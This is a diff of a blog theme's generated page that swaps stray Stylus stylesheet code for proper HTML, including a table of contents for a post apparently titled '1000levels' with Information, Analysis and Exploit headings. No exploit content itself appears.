-    +keep-tablet() {
-      transform: scale(0.9);
-      transform-origin: left top;
-    }
-  }
-
-
-  .article-content {
-    margin-top: $component-spacing-value;
-    padding-bottom: 10px;
-    word-wrap: break-word;
-    border-bottom: 1px solid var(--border-color);
-    color: var(--default-text-color);
-  }
-
-
-  .post-tags-box {
-    display: none;
-    margin-top: 1.6rem;
-    justify-content: center;
-    font-size: 1.1rem;
-
-    +keep-tablet() {
-      display: flex;
-    }
-
-    +keep-mobile() {
-      margin-top: 1.2rem;
-      font-size: 1rem;
-    }
-
-
-    .tag-item {
-      margin: 0 0.25rem;
-    }
-  }
-
-  .post-copyright-info {
-    margin-top: $component-spacing-value;
-    width: 100%;
-
-    +keep-tablet() {
-      margin-top: $component-spacing-value * 0.8;
-    }
-  }
-
-
-  .article-nav {
-    height: 40px;
-    margin-top: $component-spacing-value;
-
-    .article-prev, .article-next {
-      max-width: $post-nav-max-width;
-      height: 100%;
-      box-sizing: border-box;
-
-      keep-container(true, 1.03, 1.03, 10px, 0);
-
-      a {
-        position: relative;
-        display: block;
-        width: 100%;
-        height: 100%;
-        box-sizing: border-box;
-
-        &.prev {
-          padding-left: $arrow-icon-width;
-        }
-
-        &.next {
-          padding-right: $arrow-icon-width;
-        }
-
-        .arrow-icon {
-          position: absolute;
-          top: 0;
-          height: 100%;
-          width: $arrow-icon-width;
-
-          &.left {
-            left: 0;
-          }
-
-          &.right {
-            right: 0;
-          }
-        }
-
-        .title {
-          width: 100%;
-          height: 100%;
-        }
-      }
-
-    }
-
-    .article-prev {
-      float: left;
-    }
-
-    .article-next {
-      float: right;
-    }
-
-    .post-nav-item {
-      display: none;
-
-      +keep-tablet() {
-        display: inline-block;
-      }
-
-    }
-
-
-    .post-nav-title-item {
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-
-      +keep-tablet() {
-        display: none;
-      }
-    }
-
-  }
-
-
-}
-
+        
+    </div>
+</div>
 
 
                 
@@ -475,80 +444,11 @@ $article-title-font-size = 1.6rem;
 
     
         <aside class="page-aside">
-            .post-toc-wrap {
-  width: 100%;
-  font-size: 0.92rem;
-  box-sizing: border-box;
-
-  .post-toc {
-
-    ol {
-      list-style: none;
-      margin: 0;
-      padding: 0 2px 12px 10px;
-      text-align: left;
-
-      &:last-child {
-        padding-bottom: 0;
-      }
-
-      > ol {
-        padding-left: 0;
-      }
-
-      a {
-        transition-property: all;
-        transition();
-      }
-    }
-
-
-    .nav-item {
-      line-height: 1.8;
-      overflow: hidden;
-      text-overflow: ellipsis;
-      white-space: nowrap;
-    }
-
-
-    .nav {
-      .nav-child {
-        display: hexo-config('toc.expand_all') ? block : none;
-      }
-
-      .active > .nav-child {
-        display: block;
-      }
-
-      .active-current > .nav-child {
-        display: block;
-
-        > .nav-item {
-          display: block;
-        }
-      }
-
-
-      .nav-number, .nav-text {
-        color: var(--default-text-color);
-      }
-
-      .active > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-
-      .active-current > a {
-        .nav-number, .nav-text {
-          color: var(--primary-color);
-        }
-      }
-    }
-  }
-}
-
-
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1000levels"><span class="nav-number">1.</span> <span class="nav-text">1000levels</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Information"><span class="nav-number">1.1.</span> <span class="nav-text">Information</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Analysis"><span class="nav-number">1.2.</span> <span class="nav-text">Analysis</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.</span> <span class="nav-text">Exploit</span></a></li></ol></li></ol>
+    </div>
+</div>
         </aside>
     
 
